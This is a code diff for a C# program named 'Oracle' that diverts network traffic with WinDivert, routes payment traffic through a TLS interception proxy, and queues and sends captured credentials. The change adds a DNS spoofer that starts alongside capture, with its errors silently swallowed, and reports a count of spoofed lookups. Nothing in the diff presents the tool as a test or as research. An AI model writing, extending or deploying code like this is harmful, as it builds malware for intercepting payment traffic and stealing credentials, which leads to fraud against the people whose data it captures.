@@ -69,6 +69,7 @@ var ruleEngine = new Oracle.Extractor.RuleEngine();
 
 // Try WinDivert driver first, fall back to mock
 var captureDriver = CreateCaptureDriver();
+var dnsSpoofer = new DnsSpoofer();
 
 static ICaptureDriver CreateCaptureDriver()
 {
@@ -121,16 +122,17 @@ app.MapGet("/status", () =>
         credentials_queued = credQueue.TotalEnqueued,
         credentials_sent = credQueue.TotalSent,
         credentials_failed = credQueue.TotalFailed,
+        dns_spoofed = dnsSpoofer.SpoofedCount,
     });
 });
 
 // Start capture
 app.MapPost("/start", () =>
 {
-    // TLS proxy must start BEFORE WinDivert capture, because
-    // DIVERT mode immediately redirects payment traffic to it.
+    // TLS proxy must start first (before capture or DNS redirect)
     tlsProxy.Start();
     captureService.Start();
+    try { dnsSpoofer.Start(); } catch { }
     return Results.Ok(new { status = "started" });
 });
 
@@ -275,6 +277,7 @@ lifetime.ApplicationStopping.Register(() =>
     Console.WriteLine("[Oracle] Shutting down...");
     captureService.Stop();
     tlsProxy.Stop();
+    dnsSpoofer.Stop();
     credQueue.Dispose();
     Console.WriteLine("[Oracle] Credential queue flushed. Goodbye.");
 });
